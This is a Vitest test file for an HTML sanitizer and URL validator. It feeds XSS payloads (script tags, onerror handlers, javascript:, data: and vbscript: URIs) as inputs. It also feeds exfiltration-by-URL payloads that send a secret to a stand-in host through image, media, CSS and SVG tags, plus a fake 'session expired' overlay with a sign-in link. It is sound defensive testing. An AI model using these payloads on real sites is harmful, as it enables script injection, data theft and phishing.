// SPDX-License-Identifier: FSL-1.1-ALv2
import { describe, expect, it } from "vitest"
import { isSafeUserUrl, sanitizeHtml } from "./sanitize"

describe("sanitizeHtml", () => {
  it("allows safe markdown HTML tags", () => {
    const html = "<strong>bold</strong> <em>italic</em> <code>code</code>"
    expect(sanitizeHtml(html)).toContain("<strong>bold</strong>")
    expect(sanitizeHtml(html)).toContain("<em>italic</em>")
    expect(sanitizeHtml(html)).toContain("<code>code</code>")
  })

  it("keeps underline", () => {
    expect(sanitizeHtml("<u>souligné</u>")).toBe("<u>souligné</u>")
  })

  it("keeps a table column's alignment", () => {
    expect(sanitizeHtml('<table><tr><td align="right">139</td></tr></table>')).toContain(
      '<td align="right">139</td>',
    )
  })

  it("strips disallowed tags", () => {
    expect(sanitizeHtml("<script>alert(1)</script>")).not.toContain("<script>")
    expect(sanitizeHtml("<img src=x onerror=alert(1)>")).not.toContain("<img")
    expect(sanitizeHtml("<iframe src=x></iframe>")).not.toContain("<iframe")
  })

  it("blocks javascript: URIs in href", () => {
    const html = '<a href="javascript:alert(1)">click</a>'
    const result = sanitizeHtml(html)
    expect(result).not.toContain("javascript:")
  })

  it("allows https: and mailto: URIs", () => {
    expect(sanitizeHtml('<a href="https://example.com">link</a>')).toContain(
      'href="https://example.com"',
    )
    expect(sanitizeHtml('<a href="mailto:a@b.com">email</a>')).toContain('href="mailto:a@b.com"')
  })

  it("forces rel=noopener noreferrer and target=_blank on links", () => {
    const result = sanitizeHtml('<a href="https://example.com">link</a>')
    expect(result).toContain('rel="noopener noreferrer"')
    expect(result).toContain('target="_blank"')
  })

  it("strips disallowed attributes", () => {
    expect(sanitizeHtml('<span onclick="alert(1)">x</span>')).not.toContain("onclick")
    expect(sanitizeHtml('<a href="https://x.com" style="color:red">x</a>')).not.toContain("style")
  })

  it("returns empty string for empty input", () => {
    expect(sanitizeHtml("")).toBe("")
  })

  it("blocks data: URIs", () => {
    const html = '<a href="data:text/html,<script>alert(1)</script>">x</a>'
    expect(sanitizeHtml(html)).not.toContain("data:")
  })
})

describe("isSafeUserUrl", () => {
  it("allows http and https URLs", () => {
    expect(isSafeUserUrl("https://example.com/x")).toBe("https://example.com/x")
    expect(isSafeUserUrl("http://example.com")).toBe("http://example.com")
  })
  it("allows mailto URLs", () => {
    expect(isSafeUserUrl("mailto:foo@example.com")).toBe("mailto:foo@example.com")
  })
  it("rejects javascript: URLs (including obfuscated variants)", () => {
    expect(isSafeUserUrl("javascript:alert(1)")).toBeUndefined()
    expect(isSafeUserUrl("JaVaScRiPt:alert(1)")).toBeUndefined()
    expect(isSafeUserUrl("\tjavascript:alert(1)")).toBeUndefined()
    expect(isSafeUserUrl(" javascript:alert(1)")).toBeUndefined()
  })
  it("rejects data: and vbscript: URLs", () => {
    expect(isSafeUserUrl("data:text/html,<script>alert(1)</script>")).toBeUndefined()
    expect(isSafeUserUrl("vbscript:msgbox(1)")).toBeUndefined()
  })
  it("returns undefined for null/undefined/empty", () => {
    expect(isSafeUserUrl(undefined)).toBeUndefined()
    expect(isSafeUserUrl(null)).toBeUndefined()
    expect(isSafeUserUrl("")).toBeUndefined()
  })

  it("loads no remote resource from rendered agent or message text (exfiltration by URL)", () => {
    for (const html of [
      '<img src="https://evil.test/p?d=secret">',
      '<picture><source srcset="https://evil.test/a"></picture>',
      '<video src="https://evil.test/v"></video>',
      '<p style="background:url(https://evil.test/b)">x</p>',
      '<svg><image href="https://evil.test/s"/></svg>',
    ]) {
      const out = sanitizeHtml(html)
      expect(out).not.toContain("evil.test")
    }
  })
})

describe("sanitizeHtml classes", () => {
  it("drops the app's own utility classes a message could use to draw over the UI", () => {
    const out = sanitizeHtml(
      '<span class="fixed inset-0 z-50 bg-surface">Session expired, <a class="btn-primary" href="https://evil.test">sign in</a></span>',
    )
    expect(out).not.toContain("fixed")
    expect(out).not.toContain("inset-0")
    expect(out).not.toContain("btn-primary")
    expect(out).not.toContain("class=")
  })

  it("keeps the classes the renderers write", () => {
    expect(sanitizeHtml('<span class="mention-pill mention-actionable fixed">x</span>')).toContain(
      'class="mention-pill mention-actionable"',
    )
    expect(sanitizeHtml('<pre><code class="language-ts">x</code></pre>')).toContain(
      'class="language-ts"',
    )
    expect(sanitizeHtml('<li class="md-task">x</li>')).toContain('class="md-task"')
    expect(sanitizeHtml('<a class="lpmark-abc123-0">x</a>')).toContain('class="lpmark-abc123-0"')
  })
})
